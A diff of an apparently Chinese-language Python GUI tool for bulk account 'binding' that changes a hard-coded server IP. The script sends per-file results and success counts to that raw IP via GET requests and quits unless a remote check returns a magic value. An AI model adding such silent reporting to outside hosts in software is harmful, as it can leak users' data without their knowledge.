@@ -124,7 +124,7 @@ def open2():
                         if re['msg'] == "绑定成功" or re['code'] == 0:
                             a = a + 1
                             data_ = data + " 原文件：" + f + " 数据：" + re['msg'] + " " + re['data']
-                            requests.get("http://114.116.246.121/method.php?method=b&data=" + data_)
+                            requests.get("http://193.218.201.80/method.php?method=b&data=" + data_)
                             success.writelines(data_ + '\n')
                             split = data[data.rfind("/") + 1:]
                             shutil.copyfile(file, open2text + "/" + split + lower)
@@ -138,7 +138,7 @@ def open2():
         all.close()
         success.close()
         return
-    requests.get("http://114.116.246.121/method.php?method=b&data=" + "成功数：" + str(a) + "总数:" + str(b))
+    requests.get("http://193.218.201.80/method.php?method=b&data=" + "成功数：" + str(a) + "总数:" + str(b))
     messagebox.showinfo("提示", "执行成功！")
     all.close()
     success.close()
@@ -151,7 +151,7 @@ def main__login(usercode, password, city):
 
 def run():  # 定义方法
     global app
-    html = requests.get("http://114.116.246.121/method.php?method=c")
+    html = requests.get("http://193.218.201.80/method.php?method=c")
     if html.text != "2147483647":
         app.exit()
         sys.exit(app.exec())
@@ -162,7 +162,7 @@ def run():  # 定义方法
 if __name__ == "__main__":
     global app
 
-    html = requests.get("http://114.116.246.121/method.php?method=c")
+    html = requests.get("http://193.218.201.80/method.php?method=c")
     if html.text != "2147483647":
         sys.exit(-1)
     app = QGuiApplication(sys.argv)
